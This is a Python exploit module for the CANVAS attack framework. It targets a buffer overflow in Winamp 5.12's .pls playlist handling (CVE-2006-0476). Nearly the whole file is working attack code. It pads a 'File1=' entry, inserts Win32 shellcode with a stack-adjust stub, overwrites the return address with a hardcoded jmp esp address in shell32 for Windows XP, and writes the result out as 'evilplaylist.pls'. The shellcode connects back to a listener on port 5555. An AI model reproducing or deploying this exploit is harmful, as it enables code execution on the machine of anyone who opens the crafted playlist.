#! /usr/bin/env python
#This exploit was made with vsploit
#minor changes needed
#
import sys 
sys.path.append(".")
sys.path.append("../../")
sys.path.append("../../encoder")
sys.path.append("./encoder")
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
import os
import getopt
import socket
import sys
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
import addencoder
import win32shell
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator
from socket import *
import mosdef 
from mosdefutils import *

NAME= "Winamp 5.12 .pls overflow"
DESCRIPTION= "Winamp 5.12 .pls overflow"
VERSION= ""
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="Nullsoft"
DOCUMENTATION["Date public"]="02/01/06"
DOCUMENTATION["Repeatability"]=""
DOCUMENTATION["References"] = "http://www.idefense.com/intelligence/vulnerabilities/display.php?id=377"
DOCUMENTATION["CVE Name"] = "CVE-2006-0476"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0476"
DOCUMENTATION['CVSS'] = 7.6

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Windows"] ]
PROPERTY["VERSION"]= ["XP"]
GTK2_DIALOG="dialog.glade2"
runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

targets = {
    0 : ["default", 0x00000000],
    }
class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        # localhost and localport used in shellcode
        self.callbackip = ""
        self.localhost = "127.0.0.1"
        self.host = "127.0.0.1"
        self.port = 80
        self.callbackport = 5555
        self.localport = 5555
        self.covertness = 0
        self.version = 0
        self.badstring = ""
        self.connectionList = []
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.xpacket1badchars="\x00\x0a\x0d\x5c\x2e"
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcodexPacket1(self):
        badstring = self.xpacket1badchars
        self.shellcode=self.createWin32Shellcode(badstring, self.localhost,self.localport)
        # we include an esp adjust before the encoder
        # avoiding nul bytes

        adjust = mosdef.assemble("xorl %eax,%eax\nmovb $0x10,%ah\nsubl %eax,%esp\n", "X86")
        for c in badstring:
            if c in adjust:
                print "[!] BAD CHAR IN ADJUST STUB!"
        self.shellcode = adjust + self.shellcode

        return self.shellcode

    def createxPacket1(self):
        buf = '' 
        buf+="[playlist]\n"
        buf+="File1=\\\\"

        shellcode = self.createShellcodexPacket1()

        buf += "A" * (1022 - len(shellcode))
        buf += shellcode
        #buf += intel_order(0x773D10A4) #jmp esp @ shell32 EN (XP SP1)
        #buf += intel_order(0x773A4540) #jmp esp @ shell32 ES (XP SP0)       
        buf += intel_order(0x779DD57F) #jmp esp @ shell32 ES/ES (XP SP0-SP1)       
        buf += mosdef.assemble("jmp $-%d"%(5 + 4 + len(shellcode)), "X86") # 5 bytes for relative jmp itself
        buf += "C" * 24

        buf+="\nTitle1=VSPLOIT"
        buf+="\nLength1=FFF\nNumberOfEntries=1\nVersion=2"
        return buf

    def test(self):
        pass

    def run(self):
        FD_1 = open("evilplaylist.pls","w")
        self.log("evilplaylist.pls Created!")
        xpacket1buf=self.createxPacket1()
        self.log("writing packet...")
        FD_1.write(xpacket1buf)
        FD_1.close()
        self.log("closed: FD_1.")
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port))
            return 1
        self.setInfo("%s attacking %s:%d (failed!)" % (self.name, self.host, self.port))
        return 0

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
